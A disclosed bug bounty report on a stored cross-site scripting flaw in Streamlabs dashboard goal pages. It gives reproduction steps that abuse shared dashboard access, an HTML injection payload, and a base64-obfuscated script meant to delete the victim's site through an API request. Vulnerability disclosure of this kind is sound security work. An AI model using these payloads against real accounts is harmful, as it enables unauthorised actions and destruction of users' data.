# Stored XSS in [https://streamlabs.com/dashboard#/*goal] pages

## Report Details
- **Report ID**: 1049012
- **URL**: https://hackerone.com/reports/1049012
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-12-02T15:52:16.233Z
- **Disclosed**: 2020-12-26T13:22:30.728Z

## Reporter
- **Username**: sudi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: logitech

## Vulnerability Information
Heyy there,
I have found a stored xss vulnerability in the following goals setting pages.

```
https://streamlabs.com/dashboard#/followergoal
https://streamlabs.com/dashboard#/bitgoal
https://streamlabs.com/dashboard#/subgoal
https://streamlabs.com/dashboard#/tiltifydonationgoal
https://streamlabs.com/dashboard#/streamlabs-charity-donation-goal
```

This vulnerability is actually a self stored xss but as the site allows us to invite other users to our account  dashboard,  so here the xss could be used to *exploit other users also*.

---------------------------------------------------------------------------------------------------------------------------------------------------



**Steps to reproduce:**

We need to two accounts, one will be the victim other will be the attacker. Login to  the victim's account in for eg: chrome and login to attacker's account in firefox 

From Victim's acc
1. Goto https://streamlabs.com/dashboard#/settings/shared-access and click on `Create Invitation` option
2. From the menu choose *Administrator* as the role and click on the *Create* button
3. An invitation link will be generated copy it and open it in the browser where you are log in the attacker's acc.

From the Attacker's acc
4. The page will ask you to confirm the invitation, accept it
5. Then goto https://streamlabs.com/dashboard#/settings/shared-access
6. Under *My Access*, click on the hyperlink username. Clicking on the hyperlink should lead you  to  this page https://streamlabs.com/dashboard/act-as/{userId}
7. Now you have access to the victim's dashboard,then visit this page, https://streamlabs.com/dashboard#/followergoal
8. Under *Manage Goal* , in the *Title* field . Enter the xss payload "><img src=x onerror=alert()>
9. Save it and reload the page you should get the xss popup

Now access the same page from vitim's account, https://streamlabs.com/dashboard#/followergoal
You should see a popup there too

---------------------------------------------------------------------------------------------------------------------------------------------------

Instead of just popping a simple alert box we can do more things as I mentioned in report #1048655, like Deleting User's site completely. Suppose the victim removes the attacker acc after some time but the attacker has added this payload (taken from that mentioned report) 

<script>eval(atob("dmFyIHhodHRwPW5ldyBYTUxIdHRwUmVxdWVzdDt4aHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKXs0PT10aGlzLnJlYWR5U3RhdGUmJihkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGVtbyIpLmlubmVySFRNTD1hbGVydCh0aGlzLnJlc3BvbnNlVGV4dCkpfSx4aHR0cC5vcGVuKCJERUxFVEUiLCJodHRwczovL3N0cmVhbWxhYnMuY29tL2FwaS92Ni9zaXRlL2V2ZXJ5dGhpbmciKSx4aHR0cC53aXRoQ3JlZGVudGlhbHM9ITAseGh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwiYXBwbGljYXRpb24vanNvbjsiKSx4aHR0cC5zZW5kKCk7"))</script>

As soon as the victim visits the set goal  page settings this payload will execute and will delete the victim's site completely.

---------------------------------------------------------------------------------------------------------------------------------------------------

**Video POC:**

{F1101374}

---------------------------------------------------------------------------------------------------------------------------------------------------

## Impact

As I have already mentioned the impact in the above that how an attacker can make requests to endpoints like deleting site with the help of some js code and this actions will be performed when the victim visit's the page where we have inputted our payload.


Thankyou
Regards
Sudhanshu

## Attachments
- fLbac4T4VF.mp4
